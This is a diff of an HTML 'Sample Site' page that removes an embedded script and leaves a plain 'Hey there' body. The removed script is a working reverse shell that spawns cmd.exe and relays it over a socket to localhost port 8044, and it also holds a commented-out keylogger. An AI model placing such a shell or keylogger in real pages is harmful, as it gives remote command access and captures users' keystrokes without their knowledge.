@@ -1,51 +1,12 @@
+<!-- @format -->
+
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <title>Sample Site</title>
-    <script>
-      //var win = window.open("https://www.amazon.com/s?k=hello");
-      var host = "localhost";
-      var port = 8044;
-      var cmd = "cmd.exe";
-      var p = new java.lang.ProcessBuilder(cmd)
-        .redirectErrorStream(true)
-        .start();
-      var s = new java.net.Socket(host, port);
-      var pi = p.getInputStream(),
-        pe = p.getErrorStream(),
-        si = s.getInputStream();
-      var po = p.getOutputStream(),
-        so = s.getOutputStream();
-      while (!s.isClosed()) {
-        while (pi.available() > 0) so.write(pi.read());
-        while (pe.available() > 0) so.write(pe.read());
-        while (si.available() > 0) po.write(si.read());
-        so.flush();
-        po.flush();
-        java.lang.Thread.sleep(50);
-        try {
-          p.exitValue();
-          break;
-        } catch (e) {}
-      }
-      p.destroy();
-      s.close();
-
-      /* var keys = "";
-			document.onkeypress = function (e) {
-				get = window.event ? event : e;
-				key = get.keyCode ? get.keyCode : get.charCode;
-				key = String.fromCharCode(key);
-				keys += key;
-			};
-			window.setInterval(function () {
-				if (keys.length > 0) {
-					console.log(keys);
-					keys = "";
-				}
-			}, 1000);*/
-    </script>
-  </head>
-  <body></body>
+    <head>
+        <meta charset="UTF-8" />
+        <title>Sample Site</title>
+    </head>
+    <body>
+        Hey there
+    </body>
 </html>
